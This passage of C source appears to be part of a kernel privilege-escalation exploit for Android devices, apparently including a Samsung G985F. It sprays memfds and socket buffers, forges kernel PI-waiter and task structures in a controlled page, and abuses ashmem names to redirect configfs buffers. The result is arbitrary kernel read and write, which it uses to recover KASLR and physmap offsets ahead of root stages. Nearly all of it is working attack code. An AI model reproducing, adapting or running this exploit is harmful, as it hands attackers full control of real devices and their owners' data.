  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    SYSCHK(close(pre_ctx.memfds[i]));
    pre_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < post_ctx.mm_cnt - 1; i++) {
    SYSCHK(close(post_ctx.memfds[i]));
    post_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
    SYSCHK(close(spray_ctx.memfds[i]));
    spray_ctx.memfds[i] = -1;
  }

  SYSCHK(close(pcp_shaping_sv[0]));
  SYSCHK(close(pcp_shaping_sv[1]));
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  SYSCHK(close(memfd_leak));
  memfd_leak = -1;
  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
    errno = 0;
    ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
    if (sent <= 0) {
      break;
    }
  }
  pr_info("[spray] payload ready +%lldms\n", ms_since(&t_spray));
  kernelsnitch_cleanup(ks);
  ks = NULL;

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    SYSCHK(close(prepare_ctx.memfds[i]));
    prepare_ctx.memfds[i] = -1;
    kill_child(prepare_ctx.childs[i]);
  }

  return base;
}

uintptr_t prepare_good_kernel_page(int payload_mode) {
  int g985f_route_probe = payload_mode == PAGE_PAYLOAD_FOPS &&
      active_offsets && active_offsets->rt_sigreturn_route &&
      (pselect_custom_write == 1 ||
       pselect_custom_write == RTSIG_CONTROLLED_PI_PROBE_MODE);
  int max_attempts = payload_mode == PAGE_PAYLOAD_FOPS
      ? (g985f_route_probe ? 3 :
         ((active_offsets && active_offsets->umh_root) ? 2 : 4))
      : KERNEL_PAGE_SETUP_ATTEMPTS;
  if (g985f_route_probe)
    pr_info("G985F route-probe allocator attempts=%d (diagnostic only)\n",
            max_attempts);
  last_kernel_page_prepare_attempt = 0;
  struct timespec t_good;
  clock_gettime(CLOCK_MONOTONIC, &t_good);
  struct timespec deadline = t_good;
  deadline.tv_sec += 240;
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    uintptr_t base = prepare_kernel_page(payload_mode);
    if (base) {
      last_kernel_page_prepare_attempt = attempt;
      pr_info("prepare_kernel_page ok attempt=%d +%lldms\n", attempt,
              ms_since(&t_good));
      return base;
    }
    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    if (now.tv_sec >= deadline.tv_sec) {
      pr_warning("prepare_kernel_page timeout after %d attempts\n", attempt);
      break;
    }
    pr_warning("prepare_kernel_page retry %d/%d +%lldms\n", attempt,
               max_attempts, ms_since(&t_good));
  }
  return 0;
}

ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
  unsigned char blob[128];
  size_t prefix = ASHMEM_NAME_PREFIX_LEN;
  memset(blob, 0, sizeof(blob));
  /* HYB1 prefixes ashmem.name with "dev/ashmem/" (11 bytes). The
   * configfs_buffer member offsets are shared by legacy and iter-based
   * configfs file_operations; only the operation slots differ. */
  put64(blob, CFG_BIN_BUFFER_OFF - prefix, target);
  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - prefix, len);
  put32(blob, CFG_CB_MAX_SIZE_OFF - prefix, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    pr_warning("configfs write name setup failed target=%016zx len=%zu errno=%d\n",
               target, len, set_errno);
    return -1;
  }

  errno = 0;
  ssize_t wr = pwrite(fd, data, len, 0);
  if (wr < 0)
    pr_warning("configfs write pwrite failed target=%016zx len=%zu errno=%d\n",
               target, len, errno);
  return wr;
}

ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
  unsigned char blob[128];
  size_t prefix = ASHMEM_NAME_PREFIX_LEN;
  memset(blob, 0, sizeof(blob));
  /* The name prefix supplies configfs_buffer.count for simple_read_from_buffer;
   * position near that prefix makes the requested kernel span the read source. */
  off_t pos = (off_t)(ASHMEM_PREFIX_COUNT - len);
  uintptr_t page = target - (uintptr_t)pos;
  put64(blob, CFG_PAGE_OFF - prefix, page);
  put32(blob, CFG_NEEDS_READ_FILL_OFF - prefix, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    pr_warning("configfs read name setup failed target=%016zx len=%zu errno=%d\n",
               target, len, set_errno);
    return -1;
  }

  errno = 0;
  ssize_t rd = pread(fd, data, len, pos);
  if (rd < 0)
    pr_warning("configfs read pread failed target=%016zx len=%zu pos=%lld errno=%d\n",
               target, len, (long long)pos, errno);
  return rd;
}

int is_kernel_ptr(uintptr_t value) {
  return value >= 0xffff800000000000ULL;
}

int is_direct_ptr(uintptr_t value) {
  uintptr_t end = DIRECT_MAP_END;
  return value >= DIRECT_MAP_BASE && (end == 0 || value < end);
}

int init_runtime_physmap(int fd) {
  if (!active_offsets || !active_offsets->canonical_data ||
      !active_offsets->off_memstart_addr ||
      !active_offsets->off_kimage_voffset) return 1;

  uintptr_t memstart_slot = text_addr(
      KIMAGE_TEXT_BASE + active_offsets->off_memstart_addr);
  uintptr_t voffset_slot = text_addr(
      KIMAGE_TEXT_BASE + active_offsets->off_kimage_voffset);
  uint64_t memstart = kernel_read64(fd, memstart_slot);
  uint64_t voffset = kernel_read64(fd, voffset_slot);
  uintptr_t phys_text = kaslr_base - voffset;
  uintptr_t direct_text = P0_PAGE_OFFSET + (phys_text - memstart);
  pr_info("physmap memstart=%016llx voffset=%016llx phys_text=%016zx direct_text=%016zx\n",
          (unsigned long long)memstart, (unsigned long long)voffset,
          phys_text, direct_text);
  if (!memstart || !voffset || (memstart & ((1ULL << 30) - 1)) ||
      (phys_text & (PAGE_SIZE - 1)) || !is_direct_ptr(direct_text)) {
    pr_error("physmap rejected runtime values\n");
    return 0;
  }
  runtime_memstart_addr = memstart;
  runtime_kimage_voffset = voffset;
  runtime_phys_ready = 1;
  return 1;
}

/* Route-probe-only readback. Receiving the queued SKBs frees the controlled
 * page, so callers must invoke this only after the PI walk is completely
 * finished and when no CFI/root stage will reuse the page. The controlled
 * legacy probe rewrites the live stack waiter, not the W0 template stored in
 * the SKB. A completed chain walk is therefore detected through the
 * controlled lock/task roots and W0's PI-tree parent marker, not W0.prio. */
int route_probe_payload_readback(void) {
  if (reclaim_sv[1] < 0 || !skb_buf || !fake_w0) return 0;

  unsigned char *readback = malloc(SKB_SEND_SIZE);
  if (!readback) return 0;
  struct iovec iov = { .iov_base = readback, .iov_len = SKB_SEND_SIZE };
  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  const size_t probe_offsets[] = {
    LOCK_OFF + 0x08,
    LOCK_OFF + 0x10,
    W0_OFF,
    W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF,
    FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
    FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
    FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF,
    FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF,
    W0_OFF + FAKE_WAITER_LEGACY_PRIO_OFF,
    W0_OFF + FAKE_WAITER_TASK_OFF,
    W0_OFF + FAKE_WAITER_LOCK_OFF,
  };
  int touched = 0;
  int controlled_pi_probe = active_offsets && active_offsets->rt_sigreturn_route &&
      pselect_custom_write == RTSIG_CONTROLLED_PI_PROBE_MODE;
  for (int receive = 0; receive < SKB_RECLAIM_SENDS; receive++) {
    memset(readback, 0, SKB_SEND_SIZE);
    errno = 0;
    ssize_t n = recvmsg(reclaim_sv[1], &msg, MSG_DONTWAIT);
    if (n <= 0) break;
    for (size_t chunk = 0; chunk < (size_t)n; chunk += ORDER3_SIZE) {
      uint64_t values[sizeof(probe_offsets) / sizeof(probe_offsets[0])] = {0};
      int complete = 1;
      for (size_t field = 0;
           field < sizeof(probe_offsets) / sizeof(probe_offsets[0]); field++) {
        size_t off = chunk + SKB_FRAG_BIAS + probe_offsets[field];
        if (off + sizeof(uint64_t) > (size_t)n) {
          complete = 0;
          break;
        }
        memcpy(&values[field], readback + off, sizeof(values[field]));
      }
      if (!complete) break;
      pr_info("route-probe readback receive=%d chunk=%zu lock_root=%016llx "
              "lock_left=%016llx w0_tree=%016llx w0_pi=%016llx "
              "task_pi_root=%016llx task_pi_left=%016llx "
              "pi_top=%016llx blocked=%016llx w0_prio=%llu "
              "w0_task=%016llx w0_lock=%016llx original_prio=%d\n",
              receive, chunk / ORDER3_SIZE,
              (unsigned long long)values[0],
              (unsigned long long)values[1],
              (unsigned long long)values[2],
              (unsigned long long)values[3],
              (unsigned long long)values[4],
              (unsigned long long)values[5],
              (unsigned long long)values[6],
              (unsigned long long)values[7],
              (unsigned long long)values[8],
              (unsigned long long)values[9],
              (unsigned long long)values[10],
              FAKE_WAITER_PRIO);
      if (controlled_pi_probe) {
        /* Before the walk these are fake_w0, fake_w0+pi_tree_entry, and the
         * isolated black-root marker. Dequeue/requeue replaces those with
         * the live stack waiter and clears W0's former PI-tree node. */
        if (values[0] != fake_w0 ||
            values[4] != fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF ||
            values[3] != 1)
          touched = 1;
      } else if (values[8] != FAKE_WAITER_PRIO &&
                 values[9] == fake_task && values[10] == fake_lock) {
        touched = 1;
      }
    }
  }
  free(readback);
  return touched;
}

uint64_t kernel_read64(int fd, uintptr_t target) {
  uint64_t value = 0;
  ssize_t n = kernel_read_data(fd, target, &value, sizeof(value));
  if (n != (ssize_t)sizeof(value)) {
    return 0;
  }
  return value;
}

ssize_t kernel_write_data(int fd, uintptr_t target, const void *data, size_t len) {
  return configfs_write_once(fd, target, data, len);
}

ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len) {
  return configfs_read_once(fd, target, data, len);
}

uintptr_t pselect_write_value(void) {
  return pselect_custom_value;
}

uint64_t mono_ns(void) {
  struct timespec ts;
  clock_gettime(CLOCK_MONOTONIC, &ts);
  return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
}uintptr_t pselect_write_target(void) {
  return pselect_custom_target;
}
int pselect_custom_write_enabled(void) {
  return pselect_custom_write;
}
int pselect_write_shape(void) {
  return 1;
}
void set_pselect_write(uintptr_t target, uintptr_t value) {
  pselect_custom_target = target;
  pselect_custom_value = value;
  pselect_custom_write = 1;
}
